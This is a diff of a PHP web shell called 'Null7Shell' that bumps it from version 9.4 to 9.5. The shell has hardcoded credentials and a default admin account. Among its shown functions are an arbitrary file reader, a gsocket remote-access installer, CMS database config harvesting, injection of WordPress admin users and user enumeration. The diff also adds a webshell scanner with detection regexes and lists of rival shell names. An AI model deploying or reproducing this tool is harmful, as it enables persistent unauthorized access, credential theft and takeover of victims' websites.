@@ -1,9 +1,7 @@
 <?php
-
 error_reporting(E_ERROR | E_PARSE);
 @ini_set('display_errors', 0);
 session_start();
-
 
 define('N7_USER', 'null7');
 define('N7_PASS', 'null7ganteng@gmail.com');
@@ -11,7 +9,7 @@ define('N7_HASH', hash('sha256', N7_USER . '::' . N7_PASS));
 define('N7_NAME', 'Null7Shell');
 define('N7_AUTHOR', 'null7');
 define('N7_CONTACT', 'null7ganteng@gmail.com');
-define('N7_VERSION', '9.4');
+define('N7_VERSION', '9.5');
 define('N7_DEFAULT_EMAIL', 'null7ganteng@gmail.com');
 define('N7_DEFAULT_ADMIN_USER', 'null7admin');
 define('N7_DEFAULT_ADMIN_PASS', 'Null7!Admin@2024');
@@ -19,7 +17,6 @@ define('N7_GS_URL_BASE', 'https://github.com/hackerschoice/gsocket/releases/late
 define('N7_BG_GIF', 'https://media4.giphy.com/media/v1.Y2lkPTZjMDliOTUya241ajlqZXU1MDBvczB1dzV1NmlrMmhtMTJ3dHJhbXl5dTltMDJ5YyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Y34v7S5jENXAdbkfYh/giphy.gif');
 
 if (empty($_SESSION['n7_csrf'])) $_SESSION['n7_csrf'] = bin2hex(random_bytes(16));
-
 
 function n7_csrf_ok() { return isset($_POST['csrf']) && hash_equals($_SESSION['n7_csrf'], $_POST['csrf']); }
 function h($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
@@ -58,8 +55,6 @@ function n7_perm_label($file) {
     $p = @fileperms($file);
     return $p === false ? '????' : substr(sprintf('%o', $p), -4);
 }
-
-
 function n7_self_host() {
     return strtolower(preg_replace('/:\d+$/', '', $_SERVER['HTTP_HOST'] ?? 'localhost'));
 }
@@ -73,8 +68,6 @@ function n7_validate_target($target) {
     if ($host === '') return false;
     return $host === $self || str_ends_with($self, '.' . $host) || str_ends_with($host, '.' . $self);
 }
-
-
 function n7_detect_ip() {
     foreach (['HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','HTTP_CF_CONNECTING_IP','HTTP_X_CLIENT_IP','SERVER_ADDR'] as $k) {
         if (!empty($_SERVER[$k])) {
@@ -134,11 +127,9 @@ function n7_server_info() {
     $i['uid']         = function_exists('posix_getuid') ? posix_getuid() : '-';
     $i['mem_limit']   = ini_get('memory_limit') ?: '?';
     $i['mem_used']    = function_exists('memory_get_usage') ? n7_size(memory_get_usage(true)) : 'N/A';
-
     $df = @disk_free_space('/'); $dt = @disk_total_space('/');
     $i['disk_free']  = ($df !== false && is_numeric($df)) ? n7_size($df) : 'N/A';
     $i['disk_total'] = ($dt !== false && is_numeric($dt)) ? n7_size($dt) : 'N/A';
-
     $i['curl']         = function_exists('curl_init') ? 'YES' : 'NO';
     $i['shell_exec']   = function_exists('shell_exec') ? 'YES' : 'NO';
     $i['mysqli']       = function_exists('mysqli_connect') ? 'YES' : 'NO';
@@ -148,6 +139,135 @@ function n7_server_info() {
     return $i;
 }
 
+function n7_shell_scan($root = null) {
+    if ($root === null || !is_dir($root)) {
+        $root = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
+        if (!is_dir($root)) $root = getcwd();
+    }
+    $root = rtrim(realpath($root) ?: $root, DIRECTORY_SEPARATOR);
+    $log = "=== WEBSHELL SCANNER ===\n" . str_repeat('=', 60) . "\n";
+    $log .= "SCAN ROOT: $root\n";
+    $log .= "TIME: " . date('Y-m-d H:i:s') . "\n\n";
+
+    $patterns = [
+        'eval_post'         => '/eval\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'eval_var'          => '/eval\s*\(\s*\$[a-zA-Z_]/i',
+        'base64_decode'     => '/base64_decode\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'gzinflate'         => '/gzinflate\s*\(\s*base64_decode/i',
+        'gzuncompress'      => '/gzuncompress\s*\(\s*base64_decode/i',
+        'str_rot13_eval'    => '/eval\s*\(\s*str_rot13/i',
+        'assert_post'       => '/assert\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'system_var'        => '/system\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'exec_var'          => '/exec\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'shell_exec_var'    => '/shell_exec\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'passthru_var'      => '/passthru\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'popen_var'         => '/popen\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'proc_open_var'     => '/proc_open\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'preg_e'            => '/preg_replace\s*\(\s*[\'"].*\/e[\'"]/i',
+        'create_function'   => '/create_function\s*\(\s*[\'"].*eval/i',
+        'file_put_contents' => '/file_put_contents\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'fwrite_post'       => '/fwrite\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'move_uploaded'     => '/move_uploaded_file\s*\(\s*\$_(FILES|POST)/i',
+        'php_uname_system'  => '/php_uname\s*\(\s*\)\s*[;.]/i',
+        'cmd_param'         => '/\$_GET\s*\[\s*[\'"](?:cmd|exec|command|shell|q|act)[\'"]\s*\]/i',
+        'eval_request_var'  => '/eval\s*\(\s*(?:@)?\$_(?:POST|REQUEST|GET|COOKIE)\s*\[/i',
+        'assert_eval'       => '/@?assert\s*\(\s*(?:@)?\$_(?:POST|REQUEST|GET|COOKIE)/i',
+        'chr_obfusc'        => '/(?:chr\s*\(\s*\d+\s*\)\s*\.\s*){5,}/i',
+        'var_dump_post'     => '/var_dump\s*\(\s*\$_(POST|REQUEST|GET)/i',
+        'md5_post'          => '/md5\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
+        'shell_get'         => '/\$_GET\s*\[\s*[\'"](?:c|cmd|exec|command)[\'"]\s*\]\s*(?:;|\)|\])/i',
+        'eval_string'       => '/eval\s*\(\s*[\'"][^\'"]{20,}/i',
+        'system_get'        => '/system\s*\(\s*\$_GET/i',
+        'include_get'       => '/(?:include|require)(?:_once)?\s*\(\s*\$_GET/i',
+        'include_post'      => '/(?:include|require)(?:_once)?\s*\(\s*\$_POST/i',
+    ];
+
+    $suspicious_names = [
+        'shell', 'cmd', 'backdoor', 'wso', 'b374k', 'c99', 'r57', 'webshell',
+        'uploader', 'pwn', 'hack', 'ghost', 'mini', 'alfa', 'indoxploit',
+        'marijuana', 'priv8', 'anonym', 'cyber', 'dark', 'black', 'null7',
+        'xploit', 'defacer', 'mass', 'symlink', 'ajax', 'gate', 'drop',
+    ];
+
+    $results = [];
+    $stats = ['scanned' => 0, 'detected' => 0, 'suspicious' => 0, 'errors' => 0];
+    $skip_dirs = ['node_modules', 'vendor', '.git', '.svn', '.cache', 'cache', 'tmp', 'temp'];
+
+    try {
+        $it = new RecursiveIteratorIterator(
+            new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
+            RecursiveIteratorIterator::SELF_FIRST
+        );
+        foreach ($it as $f) {
+            if ($f->getExtension() !== 'php') continue;
+            $path = $f->getPathname();
+            $basename = strtolower($f->getBasename());
+            $skip = false;
+            foreach ($skip_dirs as $sd) {
+                if (strpos($path, DIRECTORY_SEPARATOR . $sd . DIRECTORY_SEPARATOR) !== false) { $skip = true; break; }
+            }
+            if ($skip) continue;
+            $stats['scanned']++;
+            if ($f->getSize() > 5 * 1024 * 1024) continue;
+            $content = @file_get_contents($path, false, null, 0, 200 * 1024);
+            if ($content === false) { $stats['errors']++; continue; }
+            $matches = [];
+            foreach ($patterns as $pname => $pre) {
+                if (@preg_match($pre, $content)) $matches[] = $pname;
+            }
+            $score = count($matches);
+            $name_flag = false;
+            foreach ($suspicious_names as $sn) {
+                if (strpos($basename, $sn) !== false) { $name_flag = true; break; }
+            }
+            if ($name_flag) $score += 3;
+            $entropy_flag = false;
+            if (strlen($content) > 500) {
+                $sample = substr($content, 0, 3000);
+                $b64chars = preg_match_all('/[A-Za-z0-9+\/]{100,}/', $sample);
+                if ($b64chars >= 2) { $entropy_flag = true; $score += 2; }
+            }
+            if ($score >= 2) {
+                $stats['detected']++;
+                $results[] = ['path' => $path, 'size' => $f->getSize(), 'score' => $score,
+                    'matches' => $matches, 'name_flag' => $name_flag, 'entropy' => $entropy_flag];
+            } elseif ($score === 1) {
+                $stats['suspicious']++;
+                $results[] = ['path' => $path, 'size' => $f->getSize(), 'score' => $score,
+                    'matches' => $matches, 'name_flag' => $name_flag, 'entropy' => $entropy_flag];
+            }
+        }
+    } catch (Throwable $ex) {
+        $log .= "EXCEPTION: " . $ex->getMessage() . "\n";
+    }
+
+    usort($results, fn($a, $b) => $b['score'] <=> $a['score']);
+
+    $log .= "=== STATISTICS ===\n";
+    $log .= "Scanned PHP files : " . $stats['scanned'] . "\n";
+    $log .= "Detected (score>=2): " . $stats['detected'] . "\n";
+    $log .= "Suspicious (score=1): " . $stats['suspicious'] . "\n";
+    $log .= "Read errors       : " . $stats['errors'] . "\n\n";
+
+    if (empty($results)) {
+        $log .= "✔ No webshell detected. Clean!\n";
+        return $log;
+    }
+
+    $log .= "=== DETECTED FILES ===\n\n";
+    foreach ($results as $idx => $r) {
+        $tag = $r['score'] >= 2 ? '⚠ DETECTED' : '? SUSPICIOUS';
+        $log .= sprintf("[%d] %s (score=%d)\n", $idx + 1, $tag, $r['score']);
+        $log .= "    Path: " . $r['path'] . "\n";
+        $log .= "    Size: " . n7_size($r['size']) . "\n";
+        if ($r['name_flag']) $log .= "    ⚑ Suspicious filename\n";
+        if ($r['entropy']) $log .= "    ⚑ High base64 obfuscation\n";
+        if (!empty($r['matches'])) $log .= "    Signals: " . implode(', ', array_slice($r['matches'], 0, 10)) . "\n";
+        $log .= "\n";
+    }
+    $log .= "TOTAL FINDINGS: " . count($results) . "\n";
+    return $log;
+}
 
 $logged = !empty($_SESSION['n7_auth']) && $_SESSION['n7_auth'] === N7_HASH;
 if (!$logged && isset($_POST['login_user'], $_POST['login_pass'])) {
@@ -168,54 +288,35 @@ if (!$logged) {
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 body{background:#050005;min-height:100vh;display:flex;align-items:center;justify-content:center;
   font-family:'Courier New',monospace;color:#e0d0e8;padding:16px;
-  background-image:
-    linear-gradient(rgba(20,0,25,.35), rgba(10,0,20,.5)),
-    url('<?=$bg?>');
-  background-size:cover;background-position:center center;
-  background-attachment:fixed;background-repeat:no-repeat}
+  background-image:linear-gradient(rgba(20,0,25,.35), rgba(10,0,20,.5)),url('<?=$bg?>');
+  background-size:cover;background-position:center center;background-attachment:fixed;background-repeat:no-repeat}
 body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
-  background:
-    radial-gradient(circle at 15% 0%, rgba(120,0,80,.3) 0%, transparent 50%),
+  background:radial-gradient(circle at 15% 0%, rgba(120,0,80,.3) 0%, transparent 50%),
     radial-gradient(circle at 85% 100%, rgba(0,80,100,.25) 0%, transparent 50%),
-    radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,.75) 100%);
-  mix-blend-mode:multiply}
+    radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,.75) 100%);mix-blend-mode:multiply}
 body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
   background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(255,0,60,.02) 3px 4px);
   animation:scanline 8s linear infinite}
 @keyframes scanline{0%{background-position:0 0}100%{background-position:0 100%}}
-.lb{position:relative;z-index:2;
-  background:linear-gradient(135deg, rgba(40,0,50,.72), rgba(15,0,25,.82));
+.lb{position:relative;z-index:2;background:linear-gradient(135deg, rgba(40,0,50,.72), rgba(15,0,25,.82));
   backdrop-filter:blur(16px) saturate(1.3);-webkit-backdrop-filter:blur(16px) saturate(1.3);
-  border:2px solid rgba(180,0,80,.7);
-  border-radius:14px;
-  padding:30px 24px;width:100%;max-width:400px;
-  box-shadow:
-    0 0 60px rgba(255,0,60,.4),
-    0 0 100px rgba(150,0,180,.25),
-    inset 0 0 40px rgba(180,0,80,.15)}
-.skull{font-size:80px;text-align:center;color:#ff2a5f;
-  text-shadow:0 0 20px #ff0040,0 0 50px #aa0050,0 0 3px #000;
+  border:2px solid rgba(180,0,80,.7);border-radius:14px;padding:30px 24px;width:100%;max-width:400px;
+  box-shadow:0 0 60px rgba(255,0,60,.4),0 0 100px rgba(150,0,180,.25),inset 0 0 40px rgba(180,0,80,.15)}
+.skull{font-size:80px;text-align:center;color:#ff2a5f;text-shadow:0 0 20px #ff0040,0 0 50px #aa0050,0 0 3px #000;
   animation:pulse 2.2s infinite;margin-bottom:6px}
 @keyframes pulse{0%,100%{opacity:.88;transform:scale(1)}50%{opacity:1;transform:scale(1.07)}}
-h1{text-align:center;color:#ff4477;letter-spacing:4px;font-size:20px;
-  text-shadow:0 0 14px #ff0040,0 0 4px #000;margin-bottom:16px}
+h1{text-align:center;color:#ff4477;letter-spacing:4px;font-size:20px;text-shadow:0 0 14px #ff0040,0 0 4px #000;margin-bottom:16px}
 label{display:block;color:#d080a0;font-size:11px;margin:12px 0 5px;letter-spacing:1px;text-shadow:0 0 3px #000}
-input{width:100%;padding:12px 14px;
-  background:rgba(30,0,40,.85);border:1px solid #a00060;border-radius:6px;
-  color:#ffb0d0;font-family:inherit;font-size:14px;outline:none;transition:.2s;
-  backdrop-filter:blur(4px);-webkit-backdrop-filter:blur(4px)}
-input:focus{border-color:#ff2a5f;
-  box-shadow:0 0 18px rgba(255,0,60,.6);background:rgba(45,0,55,.9)}
-button{width:100%;margin-top:20px;padding:14px;
-  background:linear-gradient(180deg,#a0003a,#500020);
-  border:1px solid #ff2a5f;border-radius:6px;color:#ffffff;
-  font-family:inherit;font-size:13px;font-weight:bold;letter-spacing:4px;cursor:pointer;
-  text-shadow:0 0 8px #ff0040,0 0 3px #000;transition:.2s;
+input{width:100%;padding:12px 14px;background:rgba(30,0,40,.85);border:1px solid #a00060;border-radius:6px;
+  color:#ffb0d0;font-family:inherit;font-size:14px;outline:none;transition:.2s;backdrop-filter:blur(4px)}
+input:focus{border-color:#ff2a5f;box-shadow:0 0 18px rgba(255,0,60,.6);background:rgba(45,0,55,.9)}
+button{width:100%;margin-top:20px;padding:14px;background:linear-gradient(180deg,#a0003a,#500020);
+  border:1px solid #ff2a5f;border-radius:6px;color:#ffffff;font-family:inherit;font-size:13px;
+  font-weight:bold;letter-spacing:4px;cursor:pointer;text-shadow:0 0 8px #ff0040,0 0 3px #000;transition:.2s;
   box-shadow:0 0 20px rgba(180,0,80,.4)}
-button:hover{background:linear-gradient(180deg,#d0004a,#800030);
-  box-shadow:0 0 30px rgba(255,0,60,.75)}
-.err{background:rgba(160,0,50,.4);border:1px solid #ff2a5f;color:#ff7080;
-  padding:9px;border-radius:6px;font-size:11px;text-align:center;margin-bottom:10px;letter-spacing:1px}
+button:hover{background:linear-gradient(180deg,#d0004a,#800030);box-shadow:0 0 30px rgba(255,0,60,.75)}
+.err{background:rgba(160,0,50,.4);border:1px solid #ff2a5f;color:#ff7080;padding:9px;
+  border-radius:6px;font-size:11px;text-align:center;margin-bottom:10px;letter-spacing:1px}
 .foot{text-align:center;color:#996080;font-size:10px;margin-top:14px;letter-spacing:1px;text-shadow:0 0 3px #000}
 @media(max-width:400px){.skull{font-size:65px}h1{font-size:17px}.lb{padding:24px 16px}}
 </style></head><body>
@@ -255,7 +356,6 @@ document.getElementById('loginForm').addEventListener('submit', function(e){
     exit;
 }
 
-
 if (isset($_GET['action']) && $_GET['action'] === 'readfile' && !empty($_GET['f'])) {
     header('Content-Type: application/json');
     try {
@@ -271,7 +371,6 @@ if (isset($_GET['action']) && $_GET['action'] === 'readfile' && !empty($_GET['f'
     exit;
 }
 
-
 $page = $_GET['p'] ?? 'home';
 if ($page === 'cms') $page = 'exploit';
 if (!in_array($page, ['home', 'exploit', 'gsocket', 'tools'])) $page = 'home';
@@ -282,7 +381,6 @@ $self_host = n7_self_host();
 $self_base = n7_self_base();
 $srv = n7_server_info();
 $csrf = $_SESSION['n7_csrf'];
-
 
 function n7_gs_arch() {
     $u = php_uname('m');
@@ -435,7 +533,6 @@ function n7_gs_auto($session = null, $delay = 0) {
     return $log;
 }
 
-
 function n7_get($url, $t = 10, $h = []) {
     if (!function_exists('curl_init')) {
         $ctx = stream_context_create(['http' => ['timeout' => $t, 'ignore_errors' => true, 'header' => implode("\r\n", array_merge(['User-Agent: Mozilla/5.0'], $h))],
@@ -503,7 +600,6 @@ function n7_db_q($conn, $sql) {
     }
     return ['ok' => false, 'error' => 'no connector', 'rows' => []];
 }
-
 
 function n7_find_configs($root = null) {
     $dirs = [];
@@ -613,7 +709,6 @@ function n7_parse_ojs($path) {
     if (!$db['host'] || !$db['name'] || !$db['user']) return null;
     return ['db' => $db, 'prefix' => ''];
 }
-
 
 function n7_wp_inject($cfg, $u, $p, $e) {
     $log = "WP DB-INJECT\n" . str_repeat('=', 50) . "\n";
@@ -751,7 +846,6 @@ function n7_auto_cms_attack($u, $p, $e, $root = null) {
     }
     return $log;
 }
-
 
 function n7_x_user_enum($t) {
     $t = rtrim($t, '/'); $log = "USER ENUM: $t\n" . str_repeat('=', 50) . "\n"; $f = 0;
@@ -903,7 +997,6 @@ function n7_full_scan($t) {
     return $o;
 }
 
-
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
     if (!n7_csrf_ok()) { $msg = '⚠ CSRF invalid'; $msg_type = 'err'; }
     else {
@@ -1010,7 +1103,6 @@ if ($page === 'gsocket' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST
     }
 }
 
-
 $cms_result = '';
 if (isset($_POST['cms_act']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     if (!n7_csrf_ok()) { $cms_result = '⚠ CSRF invalid'; }
@@ -1099,7 +1191,6 @@ if (isset($_POST['cms_act']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
     }
 }
 
-
 $exploit_result = '';
 if ($page === 'exploit' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['exploit_act'])) {
     if (!n7_csrf_ok()) { $exploit_result = '⚠ CSRF invalid'; }
@@ -1130,7 +1221,6 @@ if ($page === 'exploit' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST
         }
     }
 }
-
 
 $tools_result = '';
 if ($page === 'tools' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['tools_act'])) {
@@ -1201,6 +1291,10 @@ if ($page === 'tools' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['
                     }
                     if ($found === 0) echo "✘ None.\n";
                     break;
+                case 'shell_scan':
+                    $scan_root = trim($_POST['scan_root'] ?? '') ?: null;
+                    echo n7_shell_scan($scan_root);
+                    break;
             }
         } catch (Throwable $ex) { echo "EXC: " . $ex->getMessage(); }
         if ($tools_result === '') $tools_result = trim(ob_get_clean());
@@ -1214,7 +1308,6 @@ $nav_items = [
     'gsocket' => ['icon' => '🔌', 'label' => 'GSOCKET'],
     'tools'   => ['icon' => '⚙', 'label' => 'TOOLS'],
 ];
-
 
 $entries = @scandir($cwd);
 if ($entries === false) $entries = [];
@@ -1247,45 +1340,26 @@ $bg_gif = N7_BG_GIF;
 <style>
 *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
 html{scroll-behavior:smooth}
-body{
-  background:#08000d;color:#e8d8e8;font-family:'Courier New',monospace;font-size:13px;
+body{background:#08000d;color:#e8d8e8;font-family:'Courier New',monospace;font-size:13px;
   min-height:100vh;padding-bottom:50px;line-height:1.4;
-  background-image:
-    linear-gradient(rgba(15,0,25,.45), rgba(10,0,20,.55)),
-    url('<?=$bg_gif?>');
-  background-size:cover;
-  background-position:center center;
-  background-attachment:fixed;
-  background-repeat:no-repeat;
-}
-body::before{
-  content:'';position:fixed;inset:0;pointer-events:none;z-index:1;
-  background:
-    radial-gradient(circle at 15% 0%, rgba(120,0,80,.35) 0%, transparent 50%),
+  background-image:linear-gradient(rgba(15,0,25,.45), rgba(10,0,20,.55)),url('<?=$bg_gif?>');
+  background-size:cover;background-position:center center;background-attachment:fixed;background-repeat:no-repeat}
+body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:1;
+  background:radial-gradient(circle at 15% 0%, rgba(120,0,80,.35) 0%, transparent 50%),
     radial-gradient(circle at 85% 100%, rgba(0,90,110,.3) 0%, transparent 50%),
-    radial-gradient(ellipse at center, transparent 40%, rgba(10,0,20,.75) 100%);
-  mix-blend-mode:multiply;
-}
-body::after{
-  content:'';position:fixed;inset:0;pointer-events:none;z-index:1;
+    radial-gradient(ellipse at center, transparent 40%, rgba(10,0,20,.75) 100%);mix-blend-mode:multiply}
+body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:1;
   background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(255,0,80,.02) 3px 4px);
-  animation:scanline 8s linear infinite;
-}
+  animation:scanline 8s linear infinite}
 @keyframes scanline{0%{background-position:0 0}100%{background-position:0 100%}}
 a{color:#e088b0;text-decoration:none}
 a:hover{color:#ffb0d0;text-shadow:0 0 8px #ff2a5f}
 .wrap{position:relative;z-index:2;max-width:1500px;margin:0 auto;padding:12px}
-
-header{
-  display:flex;align-items:center;gap:10px;flex-wrap:wrap;
+header{display:flex;align-items:center;gap:10px;flex-wrap:wrap;
   border:1.5px solid rgba(200,20,90,.75);border-radius:10px;padding:10px 14px;margin-bottom:10px;
   background:linear-gradient(135deg, rgba(40,0,55,.75), rgba(15,0,25,.85));
   backdrop-filter:blur(16px) saturate(1.3);-webkit-backdrop-filter:blur(16px) saturate(1.3);
-  box-shadow:
-    0 0 30px rgba(255,0,80,.35),
-    0 0 60px rgba(150,0,180,.2),
-    inset 0 0 20px rgba(180,0,80,.15);
-}
+  box-shadow:0 0 30px rgba(255,0,80,.35),0 0 60px rgba(150,0,180,.2),inset 0 0 20px rgba(180,0,80,.15)}
 .skull{font-size:28px;color:#ff2a5f;text-shadow:0 0 14px #ff0040,0 0 30px #aa0050,0 0 3px #000;animation:pulse 2.2s infinite}
 @keyframes pulse{0%,100%{opacity:.9}50%{opacity:1}}
 header h1{font-size:15px;color:#ff4a80;letter-spacing:3px;text-shadow:0 0 12px #ff0040,0 0 4px #000}
@@ -1293,14 +1367,11 @@ header .meta{color:#c088b0;font-size:10px;margin-top:2px;text-shadow:0 0 3px #00
 header .spacer{flex:1;min-width:8px}
 .badge{display:inline-block;padding:1px 6px;border-radius:10px;font-size:10px;
   background:rgba(160,0,80,.55);border:1px solid #d00060;color:#ffb0d0;margin-left:5px;text-shadow:0 0 3px #000}
-
 .srv-bar{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:6px;margin-bottom:12px}
-.srv-cell{
-  background:linear-gradient(135deg, rgba(35,0,50,.78), rgba(15,0,25,.85));
+.srv-cell{background:linear-gradient(135deg, rgba(35,0,50,.78), rgba(15,0,25,.85));
   backdrop-filter:blur(12px) saturate(1.2);-webkit-backdrop-filter:blur(12px) saturate(1.2);
   border:1px solid rgba(160,0,80,.6);border-radius:6px;padding:6px 9px;font-size:10px;overflow:hidden;
-  box-shadow:0 0 12px rgba(0,0,0,.5),inset 0 0 10px rgba(180,0,80,.08);
-}
+  box-shadow:0 0 12px rgba(0,0,0,.5),inset 0 0 10px rgba(180,0,80,.08)}
 .srv-cell .k{color:#d888b8;font-size:9px;display:block;margin-bottom:1px;text-shadow:0 0 2px #000}
 .srv-cell .v{color:#ffddaa;font-weight:bold;font-size:11px;word-break:break-all;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;text-shadow:0 0 3px #000}
 .srv-cell.green{border-color:rgba(0,180,100,.6);background:linear-gradient(135deg, rgba(0,40,20,.78), rgba(0,15,10,.85))}
@@ -1309,24 +1380,19 @@ header .spacer{flex:1;min-width:8px}
 .srv-cell.cyan .k{color:#88dddd}.srv-cell.cyan .v{color:#aaffff}
 .srv-cell.warn{border-color:rgba(180,140,0,.6);background:linear-gradient(135deg, rgba(40,30,0,.78), rgba(20,15,0,.85))}
 .srv-cell.warn .k{color:#ddcc88}.srv-cell.warn .v{color:#ffeeaa}
-
 .nav-tabs{display:flex;gap:6px;margin-bottom:12px;flex-wrap:wrap}
-.nav-tab{
-  flex:1;min-width:85px;padding:9px 12px;
+.nav-tab{flex:1;min-width:85px;padding:9px 12px;
   background:linear-gradient(135deg, rgba(35,0,45,.85), rgba(15,0,25,.9));
   backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
   border:1px solid rgba(140,0,70,.7);border-radius:7px;color:#c088a8;cursor:pointer;text-align:center;
   font-size:11px;letter-spacing:2px;transition:.15s;text-decoration:none;
-  display:flex;align-items:center;justify-content:center;gap:5px;
-  text-shadow:0 0 3px #000;box-shadow:0 0 10px rgba(0,0,0,.4)
-}
+  display:flex;align-items:center;justify-content:center;gap:5px;text-shadow:0 0 3px #000;box-shadow:0 0 10px rgba(0,0,0,.4)}
 .nav-tab:hover{background:linear-gradient(135deg, rgba(60,0,80,.92), rgba(25,0,40,.92));color:#ffb0d0;border-color:#c00060}
 .nav-tab.active{background:linear-gradient(180deg,#a0003a,#500020);color:#ffffff;border-color:#ff2a5f;
   box-shadow:0 0 22px rgba(255,0,60,.65);text-shadow:0 0 6px #ff0040,0 0 3px #000}
 .nav-tab.active.green{background:linear-gradient(180deg,#006644,#003322);border-color:#00ff88;box-shadow:0 0 22px rgba(0,255,136,.6);color:#ccffdd}
 .nav-tab.active.cyan{background:linear-gradient(180deg,#006666,#003333);border-color:#00ffff;box-shadow:0 0 22px rgba(0,255,255,.6);color:#ccffff}
 @media(min-width:700px){.nav-tab{flex:0 1 auto;min-width:110px}}
-
 .btn{display:inline-flex;align-items:center;justify-content:center;gap:4px;padding:6px 11px;
   background:linear-gradient(180deg,#8a0034,#400018);border:1px solid #c00060;border-radius:5px;
   color:#ffdde8;cursor:pointer;font-family:inherit;font-size:11px;transition:.15s;
@@ -1338,21 +1404,17 @@ header .spacer{flex:1;min-width:8px}
 .btn.orange{background:linear-gradient(180deg,#5a4000,#2a1a00);border-color:#ffaa00;color:#ffeecc}
 .btn.red{background:linear-gradient(180deg,#a00020,#500010);border-color:#ff2050;color:#ffdddd}
 .btn.xs{padding:3px 7px;font-size:10px}
-
-.breadcrumb{
-  background:linear-gradient(135deg, rgba(25,0,35,.82), rgba(15,0,20,.88));
+.breadcrumb{background:linear-gradient(135deg, rgba(25,0,35,.82), rgba(15,0,20,.88));
   backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
   border:1px solid rgba(140,0,70,.6);border-radius:7px;padding:8px 12px;
   margin-bottom:12px;display:flex;align-items:center;gap:4px;flex-wrap:wrap;
-  font-size:11px;overflow-x:auto;box-shadow:0 0 12px rgba(0,0,0,.5)
-}
+  font-size:11px;overflow-x:auto;box-shadow:0 0 12px rgba(0,0,0,.5)}
 .crumb,.crumb-root{padding:3px 8px;border-radius:4px;font-size:11px;transition:.15s;text-shadow:0 0 3px #000}
 .crumb{color:#aaffcc !important;background:rgba(0,60,35,.68);border:1px solid #00c060;text-shadow:0 0 6px rgba(0,255,120,.5)}
 .crumb:hover{background:rgba(0,110,55,.85);border-color:#00ff88;color:#eeffee !important;box-shadow:0 0 12px rgba(0,255,120,.6)}
 .crumb-root{color:#ffdd66 !important;background:rgba(60,45,0,.68);border:1px solid #ffaa00;text-shadow:0 0 6px rgba(255,200,0,.5)}
 .crumb-root:hover{background:rgba(110,85,0,.85);border-color:#ffff00;color:#ffffcc !important}
 .crumb-sep{color:#88c0a8;text-shadow:0 0 3px #000}
-
 .msg{white-space:pre-wrap;background:rgba(0,0,0,.95);border:1px solid rgba(160,0,80,.7);border-radius:7px;
   padding:11px 13px;margin-bottom:12px;color:#ffccdd;font-size:12px;max-height:600px;
   overflow:auto;word-break:break-word;box-shadow:0 0 14px rgba(0,0,0,.6)}
@@ -1360,16 +1422,12 @@ header .spacer{flex:1;min-width:8px}
 .msg.term{background:#000;border-color:#00c060;color:#33ff88}
 .msg.term-cyan{background:#000;border-color:#00cccc;color:#33ffff}
 .msg.term-orange{background:#000;border-color:#ffaa00;color:#ffcc66}
-
 .grid{display:grid;grid-template-columns:1fr;gap:12px}
 @media(min-width:900px){.grid{grid-template-columns:1fr 1fr}}
-.card{
-  border:1px solid rgba(160,0,80,.65);border-radius:9px;
+.card{border:1px solid rgba(160,0,80,.65);border-radius:9px;
   background:linear-gradient(135deg, rgba(30,0,45,.85), rgba(12,0,20,.88));
   backdrop-filter:blur(14px) saturate(1.3);-webkit-backdrop-filter:blur(14px) saturate(1.3);
-  overflow:hidden;margin-bottom:12px;
-  box-shadow:0 0 22px rgba(0,0,0,.6),inset 0 0 15px rgba(180,0,80,.08);
-}
+  overflow:hidden;margin-bottom:12px;box-shadow:0 0 22px rgba(0,0,0,.6),inset 0 0 15px rgba(180,0,80,.08)}
 .card.green{border-color:rgba(0,160,100,.65);background:linear-gradient(135deg, rgba(0,35,20,.85), rgba(0,15,10,.88))}
 .card.cyan{border-color:rgba(0,140,160,.65);background:linear-gradient(135deg, rgba(0,25,40,.85), rgba(0,12,20,.88))}
 .card.orange{border-color:rgba(160,110,0,.65);background:linear-gradient(135deg, rgba(35,25,0,.85), rgba(15,12,0,.88))}
@@ -1380,7 +1438,6 @@ header .spacer{flex:1;min-width:8px}
 .card.cyan h2{background:linear-gradient(180deg,rgba(0,55,70,.95),rgba(0,20,30,.95));color:#66ddff}
 .card.orange h2{background:linear-gradient(180deg,rgba(60,40,0,.95),rgba(25,18,0,.95));color:#ffcc66}
 .card .body{padding:12px}
-
